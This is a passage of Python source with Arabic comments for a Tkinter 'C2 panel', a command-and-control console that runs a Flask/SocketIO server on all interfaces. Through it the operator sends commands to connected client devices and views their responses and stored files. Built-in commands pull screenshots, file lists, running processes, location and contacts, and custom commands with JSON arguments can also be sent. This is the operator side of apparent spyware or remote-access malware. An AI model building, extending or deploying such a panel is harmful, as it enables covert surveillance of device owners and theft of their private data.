            # عرض محتوى الملف إذا كان نصياً
            if filename.endswith((".txt", ".json", ".log", ".csv", ".xml", ".html")):
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read(10000)  # قراءة أول 10000 حرف فقط
                    
                    if len(content) == 10000:
                        content += "\n...(المزيد)..."
                    
                    file_info += "\nمحتوى الملف:\n"
                    file_info += "-" * 40 + "\n"
                    file_info += content
                except Exception as e:
                    file_info += f"\nتعذر قراءة محتوى الملف: {e}"
            
            self.command_results_text.config(state=tk.NORMAL)
            self.command_results_text.delete(1.0, tk.END)
            self.command_results_text.insert(tk.END, file_info)
            self.command_results_text.config(state=tk.DISABLED)

    def open_selected_file(self):
        """فتح الملف المحدد"""
        selection = self.files_listbox.curselection()
        if selection and self.current_selected_historical_device_id:
            index = selection[0]
            filename = self.files_listbox.get(index)
            file_path = os.path.join(DATA_RECEIVED_DIR, self.current_selected_historical_device_id, filename)
            
            try:
                # فتح الملف باستخدام التطبيق الافتراضي للنظام
                if os.path.exists(file_path):
                    if os.name == "nt":  # Windows
                        os.startfile(file_path)
                    elif os.name == "posix":  # Linux/Mac
                        import subprocess
                        subprocess.call(("xdg-open", file_path))
                else:
                    messagebox.showerror("خطأ", f"الملف غير موجود: {file_path}")
            except Exception as e:
                logger.error(f"Error opening file: {e}", exc_info=True)
                messagebox.showerror("خطأ", f"حدث خطأ أثناء فتح الملف: {e}")

    def open_device_folder(self):
        """فتح مجلد الجهاز"""
        if self.current_selected_historical_device_id:
            folder_path = os.path.join(DATA_RECEIVED_DIR, self.current_selected_historical_device_id)
            
            try:
                # فتح المجلد باستخدام مستعرض الملفات الافتراضي للنظام
                if os.path.exists(folder_path):
                    if os.name == "nt":  # Windows
                        os.startfile(folder_path)
                    elif os.name == "posix":  # Linux/Mac
                        import subprocess
                        subprocess.call(("xdg-open", folder_path))
                else:
                    messagebox.showerror("خطأ", f"المجلد غير موجود: {folder_path}")
            except Exception as e:
                logger.error(f"Error opening folder: {e}", exc_info=True)
                messagebox.showerror("خطأ", f"حدث خطأ أثناء فتح المجلد: {e}")

    def send_command(self, command_name):
        """إرسال أمر إلى الجهاز المحدد"""
        if not self.current_selected_live_client_sid:
            messagebox.showerror("خطأ", "لم يتم تحديد جهاز متصل")
            return
        
        # إرسال الأمر باستخدام معالج التحكم عن بعد المحسن
        result = remote_control_handler.send_command_to_client(
            self.current_selected_live_client_sid,
            command_name
        )
        
        # عرض نتيجة الإرسال
        if result["status"] == "sent":
            self.add_system_log(f"تم إرسال الأمر '{command_name}' إلى الجهاز (معرف الأمر: {result['command_id']})")
            
            # إضافة إلى نتائج الأوامر
            self.command_results_text.config(state=tk.NORMAL)
            self.command_results_text.insert(tk.END, f"[{datetime.datetime.now().strftime('%H:%M:%S')}] إرسال: {command_name}\n")
            self.command_results_text.see(tk.END)
            self.command_results_text.config(state=tk.DISABLED)
        else:
            messagebox.showerror("خطأ", f"فشل إرسال الأمر: {result['message']}")

    def send_custom_command(self):
        """إرسال أمر مخصص إلى الجهاز المحدد"""
        if not self.current_selected_live_client_sid:
            messagebox.showerror("خطأ", "لم يتم تحديد جهاز متصل")
            return
        
        command_name = self.custom_command_var.get().strip()
        if not command_name:
            messagebox.showerror("خطأ", "يجب إدخال اسم الأمر")
            return
        
        # تحليل معاملات JSON إذا تم توفيرها
        args = {}
        args_str = self.custom_args_var.get().strip()
        if args_str:
            try:
                args = json.loads(args_str)
                if not isinstance(args, dict):
                    messagebox.showerror("خطأ", "يجب أن تكون المعاملات على شكل كائن JSON")
                    return
            except json.JSONDecodeError as e:
                messagebox.showerror("خطأ", f"تنسيق JSON غير صالح: {e}")
                return
        
        # إرسال الأمر المخصص
        result = remote_control_handler.send_command_to_client(
            self.current_selected_live_client_sid,
            command_name,
            args
        )
        
        # عرض نتيجة الإرسال
        if result["status"] == "sent":
            self.add_system_log(f"تم إرسال الأمر المخصص '{command_name}' إلى الجهاز (معرف الأمر: {result['command_id']})")
            
            # إضافة إلى نتائج الأوامر
            self.command_results_text.config(state=tk.NORMAL)
            self.command_results_text.insert(tk.END, f"[{datetime.datetime.now().strftime('%H:%M:%S')}] إرسال: {command_name}\n")
            self.command_results_text.insert(tk.END, f"المعاملات: {json.dumps(args, ensure_ascii=False)}\n")
            self.command_results_text.see(tk.END)
            self.command_results_text.config(state=tk.DISABLED)
            
            # مسح حقول الإدخال
            self.custom_command_var.set("")
            self.custom_args_var.set("")
        else:
            messagebox.showerror("خطأ", f"فشل إرسال الأمر: {result['message']}")

    def display_command_response(self, device_id, command_name, status, payload):
        """عرض استجابة الأمر من الجهاز"""
        # إضافة إلى نتائج الأوامر
        self.command_results_text.config(state=tk.NORMAL)
        self.command_results_text.insert(tk.END, f"\n[{datetime.datetime.now().strftime('%H:%M:%S')}] استجابة: {command_name}\n")
        self.command_results_text.insert(tk.END, f"الحالة: {status}\n")
        
        # عرض البيانات المستلمة
        if payload:
            self.command_results_text.insert(tk.END, "البيانات المستلمة:\n")
            if isinstance(payload, dict):
                for key, value in payload.items():
                    if isinstance(value, (dict, list)):
                        self.command_results_text.insert(tk.END, f"{key}: {json.dumps(value, ensure_ascii=False, indent=2)}\n")
                    else:
                        self.command_results_text.insert(tk.END, f"{key}: {value}\n")
            else:
                self.command_results_text.insert(tk.END, f"{payload}\n")
        
        self.command_results_text.insert(tk.END, "-" * 40 + "\n")
        self.command_results_text.see(tk.END)
        self.command_results_text.config(state=tk.DISABLED)
        
        # تحديث تفاصيل الجهاز إذا كان هو الجهاز المحدد حالياً
        if self.current_selected_historical_device_id == device_id:
            self.display_device_details(device_id)

    def clear_command_results(self):
        """مسح نتائج الأوامر"""
        self.command_results_text.config(state=tk.NORMAL)
        self.command_results_text.delete(1.0, tk.END)
        self.command_results_text.config(state=tk.DISABLED)

    def add_system_log(self, message, error=False):
        """إضافة رسالة إلى سجلات النظام"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_type = "ERROR" if error else "INFO"
        log_message = f"[{timestamp}] [{log_type}] {message}\n"
        
        self.system_logs_text.config(state=tk.NORMAL)
        if error:
            self.system_logs_text.insert(tk.END, log_message, "error")
            self.system_logs_text.tag_configure("error", foreground="red")
        else:
            self.system_logs_text.insert(tk.END, log_message)
        self.system_logs_text.see(tk.END)
        self.system_logs_text.config(state=tk.DISABLED)

    def clear_system_logs(self):
        """مسح سجلات النظام"""
        self.system_logs_text.config(state=tk.NORMAL)
        self.system_logs_text.delete(1.0, tk.END)
        self.system_logs_text.config(state=tk.DISABLED)

    def save_system_logs(self):
        """حفظ سجلات النظام إلى ملف"""
        file_path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")],
            title="حفظ سجلات النظام"
        )
        
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(self.system_logs_text.get(1.0, tk.END))
                messagebox.showinfo("تم الحفظ", f"تم حفظ السجلات إلى: {file_path}")
            except Exception as e:
                logger.error(f"Error saving logs: {e}", exc_info=True)
                messagebox.showerror("خطأ", f"حدث خطأ أثناء حفظ السجلات: {e}")

    def _enable_commands(self, enable):
        """تمكين أو تعطيل أزرار الأوامر"""
        state = tk.NORMAL if enable else tk.DISABLED
        
        # تحديث حالة أزرار الأوامر
        self.cmd_get_info_btn.config(state=state)
        self.cmd_get_screenshot_btn.config(state=state)
        self.cmd_get_files_btn.config(state=state)
        self.cmd_get_processes_btn.config(state=state)
        self.cmd_get_location_btn.config(state=state)
        self.cmd_get_contacts_btn.config(state=state)

    def _format_size(self, size_bytes):
        """تنسيق حجم الملف بوحدات مناسبة"""
        if size_bytes < 1024:
            return f"{size_bytes} بايت"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} كيلوبايت"
        elif size_bytes < 1024 * 1024 * 1024:
            return f"{size_bytes / (1024 * 1024):.1f} ميجابايت"
        else:
            return f"{size_bytes / (1024 * 1024 * 1024):.1f} جيجابايت"


# --- وظيفة بدء التشغيل ---
def start_c2_panel():
    global gui_app
    
    # إنشاء نافذة Tkinter
    root = tk.Tk()
    gui_app = C2PanelGUI(root)
    
    # بدء خادم Flask في خيط منفصل
    flask_thread = threading.Thread(
        target=socketio.run,
        kwargs={
            "app": app,
            "host": "0.0.0.0",
            "port": 5000,
            "debug": False,
            "use_reloader": False,
        },
        daemon=True,
    )
    flask_thread.start()
    
    # إضافة سجل بدء التشغيل
    gui_app.add_system_log("تم بدء تشغيل لوحة التحكم")
    gui_app.add_system_log(f"خادم Flask يعمل على http://0.0.0.0:5000")
    
    # بدء حلقة Tkinter
    root.mainloop()


if __name__ == "__main__":
    start_c2_panel()
